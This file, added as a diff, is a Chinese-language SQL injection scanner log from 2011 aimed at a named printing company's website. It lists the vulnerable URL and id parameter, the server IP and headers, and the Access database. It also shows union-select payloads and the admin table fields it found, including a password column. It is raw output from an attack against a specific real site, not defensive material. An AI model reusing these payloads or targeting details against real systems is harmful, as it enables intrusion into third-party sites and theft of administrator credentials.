@@ -1,0 +1,33 @@
+■漏洞信息:============================================================
+ ·URL:http://yinshun.vipkj.com/ysbj.asp?id=595
+ ·页面标题：玉林市印顺印务有限公司&nbsp; 彩色名片/宣传单张/画册/PVC卡/手提袋/牛皮纸手提袋/彩色封套/复写联单
+ ·参数:id=595
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:59.53.91.108
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Wed, 24 Aug 2011 07:20:36 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 29878
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQACADQDS=KECAKPECFAMJFNEEHIILFONG; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 1
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
+找到表:admin
+找到字段:admin.id
+找到字段:admin.name
+找到字段:admin.userpassword
+找到字段:admin.admin
+------------------------------------------------------------
+name		userpassword		admin		
+联合查询列数: 总共= 0  显示的列= 1
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
